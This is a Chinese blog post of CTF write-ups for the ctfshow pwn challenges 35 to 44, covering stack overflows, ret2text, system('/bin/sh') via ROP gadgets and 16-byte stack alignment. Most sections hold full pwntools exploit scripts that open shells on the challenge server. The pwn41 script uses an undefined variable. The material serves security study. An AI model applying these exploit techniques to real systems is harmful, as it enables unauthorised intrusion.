<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pwn35-90栈溢出 | zx's Blog</title><meta name="author" content="zx"><meta name="copyright" content="zx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x01 栈溢出pwn35同pwn23，就是同一道题，除了溢出的长度不一样，这道题需要你输入的参数长度更长一些 pwn36题目提示，存在后门函数，ida中可以发现可疑函数get_flag，使用checksec检查后可以发现只开了relro，其他都没开，而且存在一个gets函数的栈溢出点，那么只需要将gets函数栈帧中的返回函数改为get_flag函数的地址即可 123456789101112131">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn35-90栈溢出">
<meta property="og:url" content="https://zx2023qj.github.io/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
<meta property="og:site_name" content="zx&#39;s Blog">
<meta property="og:description" content="0x01 栈溢出pwn35同pwn23，就是同一道题，除了溢出的长度不一样，这道题需要你输入的参数长度更长一些 pwn36题目提示，存在后门函数，ida中可以发现可疑函数get_flag，使用checksec检查后可以发现只开了relro，其他都没开，而且存在一个gets函数的栈溢出点，那么只需要将gets函数栈帧中的返回函数改为get_flag函数的地址即可 123456789101112131">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zx2023qj.github.io/img/3.jpg">
<meta property="article:published_time" content="2024-09-03T10:11:43.000Z">
<meta property="article:modified_time" content="2024-09-03T10:46:35.582Z">
<meta property="article:author" content="zx">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="ctfshow">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zx2023qj.github.io/img/3.jpg"><link rel="shortcut icon" href="/img/3.jpg"><link rel="canonical" href="https://zx2023qj.github.io/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'pwn35-90栈溢出',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-03 18:46:35'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/3.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">19</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="zx's Blog"><span class="site-name">zx's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pwn35-90栈溢出</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-03T10:11:43.000Z" title="发表于 2024-09-03 18:11:43">2024-09-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-03T10:46:35.582Z" title="更新于 2024-09-03 18:46:35">2024-09-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pwn35-90栈溢出"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="0x01-栈溢出"><a href="#0x01-栈溢出" class="headerlink" title="0x01 栈溢出"></a>0x01 栈溢出</h3><h4 id="pwn35"><a href="#pwn35" class="headerlink" title="pwn35"></a>pwn35</h4><p>同pwn23，就是同一道题，除了溢出的长度不一样，这道题需要你输入的参数长度更长一些</p>
<h4 id="pwn36"><a href="#pwn36" class="headerlink" title="pwn36"></a>pwn36</h4><p>题目提示，存在后门函数，ida中可以发现可疑函数get_flag，使用checksec检查后可以发现只开了relro，其他都没开，而且存在一个gets函数的栈溢出点，那么只需要将gets函数栈帧中的返回函数改为get_flag函数的地址即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="string">&quot;28139&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;../pwn36&quot;</span>)  <span class="comment"># 从附件中获取</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x28</span> + <span class="number">0x4</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得get_flag函数的地址</span></span><br><span class="line">get_flag_addr = elf.symbols[<span class="string">&#x27;get_flag&#x27;</span>]  </span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">b&#x27;a&#x27;</span> + p32(get_flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive() <span class="comment">#最好加上这句，不加上这句就收不到flag了，因为会异常退出（虽然我看网上的wp好像没有加上这句也收到了</span></span><br></pre></td></tr></table></figure>

<h4 id="pwn37"><a href="#pwn37" class="headerlink" title="pwn37"></a>pwn37</h4><p>和上题类似，非常的easy啊，只需要将get_flag函数换为backdoor函数即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28176&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn37&quot;)  # 从附件中获取</span><br><span class="line"></span><br><span class="line">offset = 0x12 + 0x4 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获得backdoor函数的地址</span><br><span class="line">backdoor_addr = elf.symbols[&#x27;backdoor&#x27;]  </span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p32(backdoor_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive() #最好加上这句，不加上这句就收不到flag了，因为会异常退出（虽然我看网上的wp好像没有加上这句也收到了</span><br></pre></td></tr></table></figure>

<h4 id="pwn38"><a href="#pwn38" class="headerlink" title="pwn38"></a>pwn38</h4><p>64bit的elf函数，如何利用呢，其实跟32bit的是一样的，也是修改返回地址</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240629142140413.png" alt="image-20240629142140413"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240629142108291.png" alt="image-20240629142108291"></p>
<p>实际上这道题最大的难点在于，如果你直接返回到backdoor的第一条指令的地址是会执行失败的。</p>
<p>失败的原因在于movaps函数，需要16字节对齐才能正确执行，这里跳过了一次栈操作，使用movaps能够正确执行，具体可以看Reference里面的文章，顺便偷了师傅一张图(转载于<a target="_blank" rel="noopener" href="https://www.d1lete.online/article/72)%E3%80%82">https://www.d1lete.online/article/72)。</a></p>
<p>64bit的elf一个地址是8个字节，但是由于使用的是16进制，所以16个字节才能对齐</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240629150426082.png" alt="image-20240629150426082"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28133&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn38&quot;)  # 从附件中获取</span><br><span class="line"></span><br><span class="line">offset = 0xa + 0x8  # 注意这里由于是64bit，也就是8个字节，所以需要将0x4改为0x8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获得backdoor函数的地址，0x4或者0x1都是一样的，跳过了一次push操作，这样才能执行movaps函数</span><br><span class="line">backdoor_addr =  elf.symbols[&#x27;backdoor&#x27;]  + 0x1</span><br><span class="line">backdoor_addr =  elf.symbols[&#x27;backdoor&#x27;]  + 0x4 </span><br><span class="line"></span><br><span class="line"># 注意这里改成了p64</span><br><span class="line">payload = offset*b&#x27;a&#x27; + p64(backdoor_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>

<h5 id="movaps小知识"><a href="#movaps小知识" class="headerlink" title="movaps小知识"></a>movaps小知识</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">movaps 是 x86 和 x86-64 架构中的一条指令，用于将一个 XMM 寄存器中的值（128 位的 xmm 寄存器）复制到内存或者将内存中的值加载到 XMM 寄存器中。具体来说，movaps 的功能如下：</span><br><span class="line"></span><br><span class="line">操作数类型：movaps 是 SSE（Streaming SIMD Extensions）指令集中的一部分，用于处理 SIMD（单指令多数据）操作。</span><br><span class="line"></span><br><span class="line">功能：movaps 主要用于将数据在 xmm 寄存器和内存之间传输，保证操作是按照 128 位对齐的。</span><br><span class="line"></span><br><span class="line">使用方式：</span><br><span class="line"></span><br><span class="line">将 xmm 寄存器的内容复制到内存位置：movaps XMMREG, [MEM]</span><br><span class="line">将内存中的数据加载到 xmm 寄存器：movaps [MEM], XMMREG</span><br><span class="line">特性：</span><br><span class="line"></span><br><span class="line">对齐要求：movaps 操作要求数据在内存中是 16 字节对齐的。如果内存地址不符合要求，会导致运行时异常。</span><br><span class="line">性能优化：相比较于 movups 指令（用于非对齐数据），movaps 指令对于对齐数据的处理速度更快，因为它允许硬件在处理时进行更优化的内存访问。</span><br><span class="line">在汇编语言中，movaps 指令的使用需要开发者确保数据在内存中的正确对齐，以避免程序运行时的错误和性能问题。</span><br></pre></td></tr></table></figure>

<h4 id="pwn39"><a href="#pwn39" class="headerlink" title="pwn39"></a>pwn39</h4><p>粗略看了一下ida反编译出来的代码，应该是要自己寻找&#x2F;bin&#x2F;sh字符串和system函数的地址来执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28254&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn39&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x12 + 0x4</span><br><span class="line">system_addr = elf.symbols[&#x27;system&#x27;]</span><br><span class="line">bin_sh_addr =next( elf.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line">print(hex(system_addr),hex(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p32(system_addr) + 0x4*b&#x27;a&#x27; + p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn40"><a href="#pwn40" class="headerlink" title="pwn40"></a>pwn40</h4><p>和上题类似，不过这次是64bit的elf，在传入参数时与32bit的操作有些区别</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">64位程序和32位的区别就是在于参数的传递。32位使用栈帧来作为传递的参数的保存位置，而64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。rax作为返回值 64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，rbp作为通用寄存器使用。(转载于https://tearorca.github.io/32%E4%BD%8D%E5%92%8C64%E4%BD%8D%E5%9C%A8pwn%E4%B8%AD%E7%9A%84%E4%B8%8D%E5%90%8C%E7%82%B9/)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ret指令小知识</span><br><span class="line">执行ret指令之后，会将当前rsp(esp)指向的栈内的值赋值给rip(eip)，并将rsp增大(向高地址移动)，rip相当于一个pc计数器的作用，并且jmp一下</span><br><span class="line">pop指令小知识</span><br><span class="line">将当前rsp指向的栈内的地址所对应的值赋值给某个寄存器，然后将rsp增大</span><br></pre></td></tr></table></figure>

<p>使用ROPgadget寻找elf中有pop或者ret的指令，为什么需要找一个pop指令的地址呢？这是因为64bit的传参中是用寄存器传参的，所以这里需要提前把参数存在栈上然后pop到寄存器里面，在exp中还用到了一个单独的ret指令，这是为了补全16字节的对齐，具体原因在前文已经说过了（其实换成其他对栈有操作的指令应该也可以）</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240629223348867.png" alt="image-20240629223348867"></p>
<p>由于只需要一个参数&#x2F;bin&#x2F;sh，这里选择pop rdi;ret指令，即0x4007e3（少的0会pwntools会自动补）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28266&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn40&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0xa + 0x8</span><br><span class="line">system_addr = elf.symbols[&#x27;system&#x27;]</span><br><span class="line">bin_sh_addr =next( elf.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">print(hex(system_addr),hex(bin_sh_addr))</span><br><span class="line">pop_rdi_ret_addr = 0x4007e3</span><br><span class="line">ret_addr = 0x4004fe</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p64(pop_rdi_ret_addr)+p64(bin_sh_addr)+p64(ret_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>栈结构</th>
</tr>
</thead>
<tbody><tr>
<td>read栈</td>
</tr>
<tr>
<td>参数1 -&gt;system_addr ——4 -&gt;esp指向当前栈，程序执行ret，esp上移，程序jmp到system函数，接收rdi中的&#x2F;bin&#x2F;sh作为参数</td>
</tr>
<tr>
<td>参数2 -&gt;ret_addr ——3 -&gt;esp指向当前栈，程序执行ret，esp上移，程序jmp到ret</td>
</tr>
<tr>
<td>参数3 -&gt; bin_sh_addr_addr ——2 -&gt;esp指向当前栈，程序执行pop rdi，将&#x2F;bin&#x2F;sh输入到rdi，esp上移</td>
</tr>
<tr>
<td>返回caller栈的地址 -&gt;pop_rdi_ret_addr ——1 -&gt; 返回caller栈是一个ret指令（此时esp是指向当前栈的）esp上移，程序jmp到pop rdi;ret</td>
</tr>
<tr>
<td>当前ebp</td>
</tr>
<tr>
<td>buf -&gt;offset*’a’</td>
</tr>
<tr>
<td>当前esp</td>
</tr>
</tbody></table>
<p>按照payload发送顺序，1，2，3，4为执行的过程（其实上面的都应该是rsp，不过我懒得改了，就写esp吧，需要注意的是rsp其实是根据程序的指令来变化的，也就是说栈的指针是由程序操作的，而不是栈指针自己在变化，奇怪的感悟+1</p>
<h4 id="pwn41"><a href="#pwn41" class="headerlink" title="pwn41"></a>pwn41</h4><p>确实没有了&#x2F;bin&#x2F;sh，但是不是有sh字符串吗？所以可以试着用system(‘sh’)启动shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为什么可以用sh启动shell，其实这里执行的还是/bin/sh命令，这是通过$PATH来实现的，就比如平时使用的命令其实也不是用的绝对路径，cat命令其实绝对路径是/bin/cat，只是因为$PATH中有/bin，所以就可以直接使用cat命令。（所以如果这个linux的$PATH中没有/bin的话你是不能成功使用sh启动shell的）</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28254&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn41&quot;)</span><br><span class="line"></span><br><span class="line"># offset就不赘述，一直是这样写的，就是buf的大小加上一个地址的大小</span><br><span class="line">offset = 0x12 + 0x4</span><br><span class="line">system_addr = elf.symbols[&#x27;system&#x27;]</span><br><span class="line"># 修改pwn39的脚本，改成sh就行</span><br><span class="line">sh_addr =next( elf.search(b&#x27;sh&#x27;))</span><br><span class="line"></span><br><span class="line">print(hex(system_addr),hex(sh_addr))</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p32(system_addr) + 0x4*b&#x27;a&#x27; + p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">奇怪的tip：</span><br><span class="line">使用echo创建文件的时候要注意引号，不要字符串的内容一部分是双引号一部分是单引号，这样有些引号就会丢失了（懒得用vim写是这样的</span><br></pre></td></tr></table></figure>

<h4 id="pwn42"><a href="#pwn42" class="headerlink" title="pwn42"></a>pwn42</h4><p>和上题类似，这里也就不解释了，修改一下pwn40的脚本</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240629231835131.png" alt="image-20240629231835131"></p>
<p>记得修改一下pop_rdi_ret和ret的地址，其他就没什么要修改的了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28141&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn42&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0xa + 0x8</span><br><span class="line">system_addr = elf.symbols[&#x27;system&#x27;]</span><br><span class="line"># 寻找sh的地址</span><br><span class="line">bin_sh_addr =next( elf.search(b&#x27;sh&#x27;))</span><br><span class="line">print(hex(system_addr),hex(bin_sh_addr))</span><br><span class="line">pop_rdi_ret_addr = 0x400843</span><br><span class="line">ret_addr = 0x40053e</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p64(pop_rdi_ret_addr)+p64(bin_sh_addr)+p64(ret_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn43"><a href="#pwn43" class="headerlink" title="pwn43"></a>pwn43</h4><p>什么？没有&#x2F;bin&#x2F;sh了，这咋办，要不自己写一个进去吧（点头</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240702175940525.png" alt="image-20240702175940525"></p>
<p>在使用gdb打了断点并运行之后可以使用vmmap命令查看程序各个段的权限信息，从图中可以看到在0x804b000到0x804c000之间有write权限，可以写入数据，在这里我选择的是从0x0804b060开始，在ida中显示为buf2。</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240702213616578.png" alt="image-20240702213616578"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28307&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn43&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x6c + 0x4</span><br><span class="line">system_addr = elf.symbols[&#x27;system&#x27;]</span><br><span class="line">gets_addr = elf.symbols[&#x27;gets&#x27;]</span><br><span class="line">bin_sh_addr = 0x0804b060</span><br><span class="line"></span><br><span class="line">print(hex(system_addr),hex(gets_addr))</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27;</span><br><span class="line">payload += p32(gets_addr)+p32(system_addr)+p32(bin_sh_addr)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用gdb修改地址的内容</span><br><span class="line">set *(unsigned char*)&lt;memaddr&gt; = &lt;value&gt;  ; write 1 byte</span><br><span class="line">set *(unsigned short*)&lt;memaddr&gt; = &lt;value&gt;  ; write 2 bytes</span><br><span class="line">set *(unsigned int*)&lt;memaddr&gt; = &lt;value&gt;  ; write 4 bytes</span><br><span class="line">set *(unsigned long long *)&lt;memaddr&gt; = &lt;value&gt;  ; write 8 bytes</span><br></pre></td></tr></table></figure>

<h4 id="pwn44"><a href="#pwn44" class="headerlink" title="pwn44"></a>pwn44</h4><p>采用跟上题一样的思路，没有&#x2F;bin&#x2F;sh我们就自己写进去一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解题思路：</span><br><span class="line">先覆盖到返回指令处，执行gets函数，传入参数为可写部分的地址，再执行system函数，参数为可写部分的地址，64bit的程序调用参数需要用到一个pop edi;ret指令，所以payload形式应该为offset*b&#x27;a&#x27; + pop_ret_addr + buf2_addr + gets_addr + pop_ret_addr + buf2_addr + system_addr</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240702231856023.png" alt="image-20240702231856023"></p>
